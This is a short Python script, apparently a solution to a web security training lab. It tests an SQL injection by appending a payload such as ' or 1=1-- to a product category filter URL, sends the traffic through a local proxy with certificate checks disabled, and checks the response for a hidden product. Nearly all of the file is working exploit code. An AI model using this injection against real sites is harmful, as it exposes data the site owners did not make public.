import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    print(url + uri + payload) # https://ac0b1f351e67486180442981002000ce.web-security-academy.net/filter?category=' or 1=1--
    print(r.text) # html code of page
    if "Six Pack Beer Belt" in r.text:
        # search for a string which is hidden from the public
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")

# python sqli_lab1.py https://ac0b1f351e67486180442981002000ce.web-security-academy.net "' or 1=1--"